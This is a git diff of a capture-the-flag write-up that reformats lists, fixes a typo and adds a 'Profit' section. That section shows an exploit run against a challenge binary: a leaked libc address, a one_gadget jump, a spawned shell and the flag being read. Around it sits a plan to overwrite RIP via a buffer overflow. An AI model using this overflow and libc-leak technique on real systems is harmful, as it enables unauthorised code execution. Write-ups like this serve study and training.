@@ -43,7 +43,7 @@ Now that's done, time to read some assembly to understand how it works.
 
 I'm not really a radare2 user yet, but I'm trying to learn how to use it on a daily basis, so if you have any recommendations or advices, I'm taking them!
 
-```bash
+```C
 $ r2 rescue
  -- EXPLICIT CONTENT
 [0x00400660]> aaaa
@@ -193,20 +193,22 @@ Okay, let's disassemble the main function to see where the crash happens:
 ```
 
 In short:
-	* call sym.read_password_file
-	* Display welcome message
-		* Start loop:
-		* Print "Password: "
-		* call read
-		* check passphrase
-		* end loop if passphrase is good.
+
+ * call sym.read_password_file
+ * Display welcome message
+   * Start loop:
+   * Print "Password: "
+   * call read
+   * check passphrase
+   * end loop if passphrase is good.
 
 We notice that the function `sym.admin_shell` is not called at all, maybe the goal is to jump to it from the crash.
 
 Other important things to notice:
- 	* read is called with a read size of `0xc8`
-	* Given the stack size and the used space in it, the crash does not seem to appear here.
-	* The only function called after the read is `sym.check_passphrase`.
+
+ * read is called with a read size of `0xc8`
+ * Given the stack size and the used space in it, the crash does not seem to appear here.
+ * The only function called after the read is `sym.check_passphrase`.
 
 Let's take a look at `sym.check_passphrase`:
 
@@ -257,20 +259,20 @@ One final interesting thing to look at is the `sym.admin_shell` function to see 
 
 What we have so far:
 
-	* buffer overflow on `sym.check_passphrase`
-	* no function to spawn a shell
-	* the `libc.so.6` file that the binary uses
-	* no canary
-	* NX bit enabled
+ * buffer overflow on `sym.check_passphrase`
+ * no function to spawn a shell
+ * the `libc.so.6` file that the binary uses
+ * no canary
+ * NX bit enabled
 
 Fair enough! The plan is:
 
-	1 Overwrite RIP to get control over the execution flow
-	2 LEAK the address of a function
-	3 Calculate offset difference between this function and one_gadget
-	4 Survive leak and execute one_gadget
-	5 ???
-	6 profit!
+ 1 Overwrite RIP to get control over the execution flow
+ 2 LEAK the address of a function
+ 3 Calculate offset difference between this function and one_gadget
+ 4 Survive leak and execute one_gadget
+ 5 ???
+ 6 profit!
 
 ## EIP overwriting
 
@@ -495,6 +497,45 @@ if __name__=='__main__':
     target.pwned()
 ```
 
-Binexpext is a module that wraps pexpect that you can find at https://github.com/wapiflapi/binexpect
+Binexpect is a module that wraps pexpect that you can find at https://github.com/wapiflapi/binexpect
 
+## Profit
 
+```bash
+$ python sploit.py 
+[+] Leaked fread addr: 0x7fc3150775e0
+[+] one_gadget should be at: 0x7fc31504f320
+
+      ▄▄▄·▄▄▌ ▐ ▄▌ ▐ ▄ ▄▄▄ .·▄▄▄▄      ▄• ▄▌.▄▄ · ▪   ▐ ▄  ▄▄ •
+     ▐█ ▄███· █▌▐█•█▌▐█▀▄.▀·██▪ ██     █▪██▌▐█ ▀. ██ •█▌▐█▐█ ▀ ▪
+      ██▀·██▪▐█▐▐▌▐█▐▐▌▐▀▀▪▄▐█· ▐█▌    █▌▐█▌▄▀▀▀█▄▐█·▐█▐▐▌▄█ ▀█▄
+     ▐█▪·•▐█▌██▐█▌██▐█▌▐█▄▄▌██. ██     ▐█▄█▌▐█▄▪▐█▐█▌██▐█▌▐█▄▪▐█
+     .▀    ▀▀▀▀ ▀▪▀▀ █▪ ▀▀▀ ▀▀▀▀▀•      ▀▀▀  ▀▀▀▀ ▀▀▀▀▀ █▪·▀▀▀▀
+ ▄▄▄▄    ██▓ ███▄    █ ▓█████ ▒██   ██▒ ██▓███  ▓█████  ▄████▄  ▄▄▄█████▓
+▓█████▄ ▓██▒ ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░▓██░  ██▒▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒
+▒██▒ ▄██▒██▒▓██  ▀█ ██▒▒███   ░░  █   ░▓██░ ██▓▒▒███   ▒▓█    ▄ ▒ ▓██░ ▒░
+▒██░█▀  ░██░▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▒██▄█▓▒ ▒▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░
+░▓█  ▀█▓░██░▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒██▒ ░  ░░▒████▒▒ ▓███▀ ░  ▒██▒ ░
+░▒▓███▀▒░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░▒▓▒░ ░  ░░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░
+▒░▒   ░  ▒ ░░ ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░▒ ░      ░ ░  ░  ░  ▒       ░
+ ░    ░  ▒ ░   ░   ░ ░    ░    ░    ░  ░░          ░   ░          ░
+ ░       ░           ░    ░  ░ ░    ░              ░  ░░ ░ @wapiflapi
+------░------------------------------------------------░-----------------
+- Powered by pexpect, works best with linux and gxf -
+-------------------------------------------------------------------------
+Escape character is '^]'
+ls
+flag.txt
+password.txt
+rescue
+cat flag.txt
+NDH{wilFupsdrossyerIvid}
+```
+
+# Conclusion
+
+Classiq but fun challenge, I expected it to be a bit easier since it was only worth 100 points, but after all, we are here to improve our skills and not just win points. So that means that I'm not good enough in exploitation and need to work more on this!
+
+Hope you enjoyed this post, see y'all in another article!
+
+ark.
